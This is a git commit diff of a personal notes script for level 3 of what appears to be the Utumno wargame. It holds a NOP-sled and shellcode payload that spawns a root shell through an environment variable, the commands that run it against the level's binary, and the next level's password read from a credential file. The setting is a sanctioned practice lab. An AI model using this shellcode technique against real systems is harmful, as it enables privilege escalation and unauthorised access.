1e8d9be59ab674e0e0fd9dc4e836932e0fdbefad
ballban_Jung <ballban@hotmail.com>
2025-04-20 01:57:30 +0900

    utumno3

--- Utumno/utumno3/note.sh
+++ Utumno/utumno3/note.sh
@@ -1,2 +1,27 @@
-printf "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x20\x21\x22\x23\x24" | /utumno/utumno3
-printf "123456789011121231231231" | /utumno/utumno3
+
+mkdir /tmp/utumno3_ballban
+cd /tmp/utumno3_ballban
+
+
+set args < /tmp/utumno3_ballban/text.txt
+
+
+
+
+
+python3 /tmp/utumno3_ballban/text.py > text.txt
+cat text.txt
+
+
+export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 1000 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
+/tmp/utumno2_ballban/check_env EGG
+
+
+/utumno/utumno3 < /tmp/utumno3_ballban/text.txt
+
+# run command with cat
+# I have no idea what this does
+cat  <(cat /tmp/utumno3_ballban/text.txt) -| /utumno/utumno3
+
+cat /etc/utumno_pass/utumno4
+# Password: qHWLExh7C5
